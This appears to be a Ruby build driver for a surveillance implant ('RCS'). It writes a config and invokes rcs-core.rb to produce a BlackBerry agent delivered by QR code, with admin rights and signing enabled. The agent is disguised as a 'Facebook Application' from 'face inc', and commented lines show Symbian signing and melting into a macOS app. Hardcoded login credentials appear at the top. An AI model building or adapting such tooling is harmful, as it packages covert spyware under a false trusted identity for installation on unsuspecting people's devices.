#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
PLATFORM = 'qrcode'
DB = 'localhost'
PORT = 4444
DEMO = false

ver = DEMO ? '_demo' : ''

###################################################################################################
params = {platform: PLATFORM,
          generate: {platforms: ['blackberry'],
                     binary: {demo: DEMO, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'},
                     link: 'http://www.alor.it'
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o #{PLATFORM}#{ver}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
###################################################################################################
